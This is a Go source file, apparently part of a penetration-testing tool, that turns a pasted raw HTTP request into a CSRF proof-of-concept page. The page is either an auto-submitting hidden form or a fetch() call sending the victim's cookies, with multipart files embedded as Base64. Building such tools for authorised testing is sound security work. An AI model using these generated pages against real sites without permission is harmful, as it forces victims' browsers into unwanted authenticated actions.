package csrf

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"html"
	"io"
	"mime"
	"mime/multipart"
	"net/url"
	"strings"
)

type Request struct {
	Method            string
	URL               *url.URL
	Headers           map[string]string
	Body              string
	ContentType       string
	ContentTypeHeader string
}

type Options struct {
	Scheme     string `json:"scheme"`
	Title      string `json:"title"`
	AutoSubmit *bool  `json:"autoSubmit"`
	FileMode   string `json:"fileMode"`
}

type Result struct {
	Kind    string  `json:"kind"`
	Warning *string `json:"warning"`
	HTML    string  `json:"html"`
}

type parameter struct {
	Name  string
	Value string
}

type multipartFile struct {
	Name        string
	Filename    string
	ContentType string
	Data        []byte
}

func ParseRawRequest(raw, fallbackScheme string) (Request, error) {
	normalized := strings.TrimSpace(strings.ReplaceAll(raw, "\r\n", "\n"))
	if normalized == "" {
		return Request{}, errors.New("collez d’abord une requête HTTP")
	}

	parts := strings.SplitN(normalized, "\n\n", 2)
	head := parts[0]
	body := ""
	if len(parts) == 2 {
		body = parts[1]
	}

	lines := strings.Split(head, "\n")
	requestLine := strings.Fields(strings.TrimSpace(lines[0]))
	if len(requestLine) != 3 || !strings.HasPrefix(strings.ToUpper(requestLine[2]), "HTTP/") {
		return Request{}, errors.New("la première ligne doit ressembler à : POST /route HTTP/1.1")
	}

	method := strings.ToUpper(requestLine[0])
	for _, character := range method {
		if character < 'A' || character > 'Z' {
			return Request{}, errors.New("méthode HTTP invalide")
		}
	}

	headers := make(map[string]string)
	for _, line := range lines[1:] {
		name, value, found := strings.Cut(line, ":")
		if !found || strings.TrimSpace(name) == "" {
			continue
		}
		headers[strings.ToLower(strings.TrimSpace(name))] = strings.TrimSpace(value)
	}

	var parsedURL *url.URL
	var err error
	if strings.HasPrefix(strings.ToLower(requestLine[1]), "http://") || strings.HasPrefix(strings.ToLower(requestLine[1]), "https://") {
		parsedURL, err = url.Parse(requestLine[1])
	} else {
		host := headers["host"]
		if host == "" {
			return Request{}, errors.New("l’en-tête Host est nécessaire pour une URL relative")
		}
		if fallbackScheme == "" {
			fallbackScheme = "https"
		}
		target := requestLine[1]
		if !strings.HasPrefix(target, "/") {
			target = "/" + target
		}
		parsedURL, err = url.Parse(fallbackScheme + "://" + host + target)
	}
	if err != nil || parsedURL == nil || parsedURL.Host == "" {
		return Request{}, errors.New("URL de requête invalide")
	}

	contentTypeHeader := headers["content-type"]
	if contentTypeHeader == "" {
		contentTypeHeader = "application/x-www-form-urlencoded"
	}
	contentType, _, err := mime.ParseMediaType(contentTypeHeader)
	if err != nil {
		return Request{}, errors.New("en-tête Content-Type invalide")
	}
	contentType = strings.ToLower(contentType)

	return Request{
		Method:            method,
		URL:               parsedURL,
		Headers:           headers,
		Body:              body,
		ContentType:       contentType,
		ContentTypeHeader: contentTypeHeader,
	}, nil
}

func decodeParameters(encoded string) ([]parameter, error) {
	if encoded == "" {
		return nil, nil
	}
	items := make([]parameter, 0)
	for _, item := range strings.Split(encoded, "&") {
		if item == "" {
			continue
		}
		name, value, _ := strings.Cut(item, "=")
		decodedName, err := url.QueryUnescape(name)
		if err != nil {
			return nil, errors.New("nom de paramètre URL-encoded invalide")
		}
		decodedValue, err := url.QueryUnescape(value)
		if err != nil {
			return nil, errors.New("valeur URL-encoded invalide")
		}
		items = append(items, parameter{Name: decodedName, Value: decodedValue})
	}
	return items, nil
}

func plainTextParameters(body string) []parameter {
	items := make([]parameter, 0)
	for _, item := range strings.Split(body, "&") {
		if item == "" {
			continue
		}
		name, value, _ := strings.Cut(item, "=")
		items = append(items, parameter{Name: name, Value: value})
	}
	return items
}

func multipartParameters(body, contentTypeHeader string) ([]parameter, []multipartFile, error) {
	_, attributes, err := mime.ParseMediaType(contentTypeHeader)
	if err != nil {
		return nil, nil, errors.New("en-tête multipart/form-data invalide")
	}
	boundary := attributes["boundary"]
	if boundary == "" {
		return nil, nil, errors.New("la limite boundary est absente du Content-Type multipart/form-data")
	}

	reader := multipart.NewReader(strings.NewReader(body), boundary)
	parameters := make([]parameter, 0)
	files := make([]multipartFile, 0)
	for {
		part, nextErr := reader.NextPart()
		if errors.Is(nextErr, io.EOF) {
			break
		}
		if nextErr != nil {
			return nil, nil, fmt.Errorf("corps multipart invalide : %w", nextErr)
		}

		name := part.FormName()
		filename := part.FileName()
		data, readErr := io.ReadAll(io.LimitReader(part, 2_000_001))
		_ = part.Close()
		if readErr != nil {
			return nil, nil, fmt.Errorf("lecture du champ multipart impossible : %w", readErr)
		}
		if len(data) > 2_000_000 {
			return nil, nil, errors.New("un champ multipart dépasse la limite de 2 Mo")
		}
		if name == "" {
			continue
		}
		if filename != "" {
			contentType := part.Header.Get("Content-Type")
			if contentType == "" {
				contentType = "application/octet-stream"
			}
			files = append(files, multipartFile{
				Name:        name,
				Filename:    filename,
				ContentType: contentType,
				Data:        data,
			})
			continue
		}
		parameters = append(parameters, parameter{Name: name, Value: string(data)})
	}
	return parameters, files, nil
}

func scriptString(value string) string {
	encoded, _ := json.Marshal(value)
	return string(encoded)
}

func generateMultipartBlob(request Request, parameters []parameter, files []multipartFile, title string, autoSubmit bool) Result {
	var setup strings.Builder
	setup.WriteString("      const form = new FormData();\n")
	for _, parameter := range parameters {
		fmt.Fprintf(&setup, "      form.append(%s, %s);\n", scriptString(parameter.Name), scriptString(parameter.Value))
	}
	for index, file := range files {
		encoded := base64.StdEncoding.EncodeToString(file.Data)
		fmt.Fprintf(&setup, "      const bytes%d = Uint8Array.from(atob(%s), character => character.charCodeAt(0));\n", index, scriptString(encoded))
		fmt.Fprintf(&setup, "      const file%d = new Blob([bytes%d], {type: %s});\n", index, index, scriptString(file.ContentType))
		fmt.Fprintf(&setup, "      form.append(%s, file%d, %s);\n", scriptString(file.Name), index, scriptString(file.Filename))
	}

	autoCall := ""
	if autoSubmit {
		autoCall = "    send();\n"
	}
	warning := "Les fichiers multipart ont été intégrés dans la PoC sous forme de Blob encodé en Base64. La requête peut être envoyée même si le navigateur interdit la lecture de la réponse à cause de CORS ; les cookies SameSite peuvent néanmoins empêcher l’authentification."
	document := fmt.Sprintf(`<!doctype html>
<html lang="fr">
<head><meta charset="utf-8"><title>%s</title></head>
<body>
  <button id="send">Envoyer la requête multipart</button>
  <pre id="result"></pre>
  <script>
    async function send() {
      const output = document.getElementById('result');
      try {
%s        const response = await fetch(%s, {
          method: %s,
          credentials: 'include',
          body: form
        });
        output.textContent = 'Requête envoyée. Réponse HTTP ' + response.status;
      } catch (error) {
        output.textContent = 'La requête a peut-être été envoyée, mais la réponse est inaccessible : ' + error.message;
      }
    }
    document.getElementById('send').addEventListener('click', send);
%s  </script>
</body>
</html>`, title, setup.String(), scriptString(request.URL.String()), scriptString(request.Method), autoCall)
	return Result{Kind: "multipart-fetch", Warning: &warning, HTML: document}
}

func generateMultipartManual(request Request, parameters []parameter, files []multipartFile, title string) Result {
	var fields strings.Builder
	for _, parameter := range parameters {
		fmt.Fprintf(&fields, "    <input type=\"hidden\" name=\"%s\" value=\"%s\">\n",
			html.EscapeString(parameter.Name), html.EscapeString(parameter.Value))
	}
	for _, file := range files {
		fmt.Fprintf(&fields, "    <label>%s : <input type=\"file\" name=\"%s\" accept=\"%s\" required></label>\n",
			html.EscapeString(file.Filename), html.EscapeString(file.Name), html.EscapeString(file.ContentType))
	}
	warning := "Sélection manuelle requise : un navigateur interdit de préremplir un champ fichier. La soumission automatique a été désactivée pour cette PoC."
	document := fmt.Sprintf(`<!doctype html>
<html lang="fr">
<head><meta charset="utf-8"><title>%s</title></head>
<body>
  <form id="csrf-form" action="%s" method="POST" enctype="multipart/form-data">
%s    <button type="submit">Envoyer la requête</button>
  </form>
</body>
</html>`, title, html.EscapeString(request.URL.String()), fields.String())
	return Result{Kind: "multipart-manual", Warning: &warning, HTML: document}
}

func Generate(raw string, options Options) (Result, error) {
	request, err := ParseRawRequest(raw, options.Scheme)
	if err != nil {
		return Result{}, err
	}

	autoSubmit := true
	if options.AutoSubmit != nil {
		autoSubmit = *options.AutoSubmit
	}
	title := options.Title
	if title == "" {
		title = "CSRF PoC"
	}
	escapedTitle := html.EscapeString(title)

	isGET := request.Method == "GET" || request.Method == "HEAD"
	isForm := request.ContentType == "application/x-www-form-urlencoded" ||
		request.ContentType == "multipart/form-data" ||
		request.ContentType == "text/plain"

	if isGET || isForm {
		var parameters []parameter
		var files []multipartFile
		var parseErr error
		if isGET {
			parameters, parseErr = decodeParameters(request.URL.RawQuery)
		} else if request.ContentType == "application/x-www-form-urlencoded" {
			parameters, parseErr = decodeParameters(request.Body)
		} else if request.ContentType == "multipart/form-data" {
			parameters, files, parseErr = multipartParameters(request.Body, request.ContentTypeHeader)
		} else {
			parameters = plainTextParameters(request.Body)
		}
		if parseErr != nil {
			return Result{}, parseErr
		}
		if request.ContentType == "multipart/form-data" && len(files) > 0 {
			if options.FileMode == "manual" {
				return generateMultipartManual(request, parameters, files, escapedTitle), nil
			}
			return generateMultipartBlob(request, parameters, files, escapedTitle, autoSubmit), nil
		}

		action := *request.URL
		if isGET {
			action.RawQuery = ""
			action.ForceQuery = false
		}

		enctype := ""
		if request.ContentType == "text/plain" {
			enctype = ` enctype="text/plain"`
		} else if request.ContentType == "multipart/form-data" {
			enctype = ` enctype="multipart/form-data"`
		}

		var fields strings.Builder
		for _, parameter := range parameters {
			fmt.Fprintf(&fields, "    <input type=\"hidden\" name=\"%s\" value=\"%s\">\n",
				html.EscapeString(parameter.Name), html.EscapeString(parameter.Value))
		}

		submit := ""
		if autoSubmit {
			submit = "\n  <script>document.getElementById('csrf-form').submit();</script>"
		}
		method := "POST"
		if isGET {
			method = "GET"
		}

		document := fmt.Sprintf(`<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>%s</title>
</head>
<body>
  <form id="csrf-form" action="%s" method="%s"%s>
%s    <button type="submit">Envoyer la requête</button>
  </form>%s
</body>
</html>`, escapedTitle, html.EscapeString(action.String()), method, enctype, fields.String(), submit)

		return Result{Kind: "form", HTML: document}, nil
	}

	if request.ContentType == "application/json" || strings.HasSuffix(request.ContentType, "+json") {
		warning := "Un formulaire HTML ne peut pas envoyer application/json. Cette variante utilise fetch et ne fonctionnera que si la cible autorise la requête CORS correspondante ; elle ne constitue donc pas automatiquement une PoC CSRF valide."
		autoCall := ""
		if autoSubmit {
			autoCall = "    send();\n"
		}
		document := fmt.Sprintf(`<!doctype html>
<html lang="fr">
<head><meta charset="utf-8"><title>%s</title></head>
<body>
  <button id="send">Envoyer la requête</button>
  <pre id="result"></pre>
  <script>
    async function send() {
      const output = document.getElementById('result');
      try {
        const response = await fetch(%s, {
          method: %s,
          credentials: 'include',
          headers: {'Content-Type': %s},
          body: %s
        });
        output.textContent = 'Réponse HTTP ' + response.status;
      } catch (error) {
        output.textContent = 'Requête bloquée ou échouée : ' + error.message;
      }
    }
    document.getElementById('send').addEventListener('click', send);
%s  </script>
</body>
</html>`, escapedTitle, scriptString(request.URL.String()), scriptString(request.Method),
			scriptString(request.ContentType), scriptString(request.Body), autoCall)

		return Result{Kind: "fetch", Warning: &warning, HTML: document}, nil
	}

	return Result{}, fmt.Errorf("type de contenu non pris en charge : %s", request.ContentType)
}
